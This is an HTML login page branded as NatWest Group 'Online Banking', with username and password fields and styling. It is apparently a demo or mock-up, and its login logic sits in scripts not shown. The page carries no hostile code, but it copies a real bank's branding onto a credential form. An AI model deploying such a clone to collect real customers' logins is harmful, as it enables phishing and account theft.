<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>NatWest Group — Login</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Bevan&display=swap" rel="stylesheet">
  <style>
    :root{ --purple:#5a287d; --bg:#fafafa; --card:#fff; --shadow:rgba(0,0,0,0.08); }
    *{box-sizing:border-box}
    body{font-family:'Inter',system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial,sans-serif;background:var(--bg);color:#222;line-height:1.55;margin:0}
    .wrap{min-height:100vh;display:grid;place-items:center;padding:2rem}
    .card{background:var(--card);border-radius:16px;box-shadow:0 12px 32px var(--shadow);padding:2rem;max-width:420px;width:100%}
    h1{color:var(--purple);font-size:1.4rem;margin-bottom:1rem;font-family:'Bevan','Inter',system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial,sans-serif}
    h2{font-family:'Bevan','Inter',system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial,sans-serif}
    label{display:block;font-weight:600;margin-top:0.75rem}
    input{width:100%;margin-top:0.4rem;padding:0.6rem 0.8rem;border-radius:10px;border:1px solid #ddd}
    button{margin-top:1rem;width:100%;padding:0.75rem;border-radius:12px;background:var(--purple);color:#fff;font-weight:600;border:none}
    .hint{margin-top:0.75rem;color:#555;font-size:0.9rem}
  </style>
  <script type="module" crossorigin src="./assets/login-5BdexaZd.js"></script>
  <link rel="modulepreload" crossorigin href="./assets/modulepreload-polyfill-B5Qt9EMX.js">
</head>
<body>
  <main class="wrap">
    <div class="card" id="loginForm">
      <img src="Logo_Wh_NatWestGroupColleague-Hor-Dl4V9mEr.svg" alt="Bank Enterprise logo" style="height:78px; display:block; margin:0 auto 1rem">
      <h1>Online Banking</h1>
      <p id="loginError" class="hint" style="color:#c00; display:none">Invalid username or password.</p>
      <label for="username">Username</label>
      <input id="username" placeholder="Username" required>
      <label for="password">Password</label>
      <input id="password" type="password" placeholder="Password" required>
      <button type="button" id="loginBtn">Login</button>
    </div>
  </main>
  <script src="bank.js"></script>
</body>
</html>
